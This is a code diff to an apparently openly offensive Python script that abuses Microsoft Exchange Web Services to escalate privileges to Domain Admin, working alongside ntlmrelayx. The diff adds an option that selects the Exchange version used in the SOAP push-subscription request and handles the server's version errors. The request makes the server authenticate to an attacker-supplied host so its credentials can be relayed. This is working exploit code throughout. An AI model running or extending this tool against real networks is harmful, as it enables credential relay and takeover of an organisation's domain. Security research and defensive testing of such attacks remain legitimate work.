@@ -43,7 +43,7 @@ POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
                xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
    <soap:Header>
-      <t:RequestServerVersion Version="Exchange2013" />
+      <t:RequestServerVersion Version="Exchange%s" />
    </soap:Header>
    <soap:Body >
       <m:Subscribe>
@@ -61,6 +61,8 @@ POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
 </soap:Envelope>
 '''
 
+EXCHANGE_VERSIONS = ["2010_SP1","2010_SP2","2010_SP3","2013","2016"]
+
 def main():
     parser = argparse.ArgumentParser(description='Exchange your privileges for Domain Admin privs by abusing Exchange. Use me with ntlmrelayx')
     parser.add_argument("host", type=str, metavar='HOSTNAME', help="Hostname/ip of the Exchange server")
@@ -72,6 +74,7 @@ def main():
     parser.add_argument("--exchange-port", help="Alternative EWS port (default: 443 or 80)")
     parser.add_argument("-ah", "--attacker-host", required=True, help="Attacker hostname or IP")
     parser.add_argument("-ap", "--attacker-port", default=80, help="Port on which the relay attack runs (default: 80)")
+    parser.add_argument("-ev", "--exchange-version", choices=EXCHANGE_VERSIONS, default="2013", help="Exchange dialect version (Default: 2013)")
     parser.add_argument("--attacker-page", default="/privexchange/", help="Page to request on attacker server (default: /privexchange/)")
     parser.add_argument("--debug", action='store_true', help='Enable debug output')
     args = parser.parse_args()
@@ -134,7 +137,7 @@ def main():
         "Translate": "F"
     }
 
-    session.request("POST", ews_url, POST_BODY % attacker_url, headers)
+    session.request("POST", ews_url, POST_BODY % (args.exchange_version, attacker_url), headers)
 
     res = session.getresponse()
     res.read()
@@ -180,7 +183,7 @@ def main():
         "Translate": "F"
     }
 
-    session.request("POST", ews_url, POST_BODY % attacker_url, headers)
+    session.request("POST", ews_url, POST_BODY % (args.exchange_version, attacker_url), headers)
     res = session.getresponse()
 
     logging.debug('HTTP status: %d', res.status)
@@ -207,7 +210,12 @@ def main():
     elif res.status == 401:
         logging.error('Server returned HTTP status 401 - authentication failed')
     else:
-        logging.error('Server returned HTTP %d: %s', res.status, body)
+        if res.status == 500:
+            if 'ErrorInvalidServerVersion' in body:
+                logging.error('Server does not accept this Exchange dialect, specify a different Exchange version with --exchange-version')
+                return
+        else:
+            logging.error('Server returned HTTP %d: %s', res.status, body)
 
 if __name__ == '__main__':
     main()
